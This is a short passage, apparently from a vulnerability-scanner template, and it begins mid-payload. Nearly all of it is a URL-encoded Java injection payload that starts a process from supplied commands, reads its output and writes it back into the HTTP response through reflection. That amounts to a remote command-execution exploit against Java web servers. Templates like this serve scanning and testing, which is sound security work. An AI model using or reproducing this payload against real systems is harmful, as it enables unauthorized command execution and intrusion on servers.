a.util.Scanner((new%20ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter("\\A").next().getBytes(charsetName);byte[]%20result=("Execute:%20%20%20%20"+new%20String(text2,"utf-8")).getBytes(charsetName);resp.getClass().getMethod("doWrite",%20new%20Class[]{byte[].class}).invoke(resp,%20new%20Object[]{result});}%20}catch%20(Exception%20e){continue;}}if%20(flag)%20{break;}%20}if%20(flag)%20{break;}catch%20(Exception%20e){continue;}%20}

    matchers-condition: and
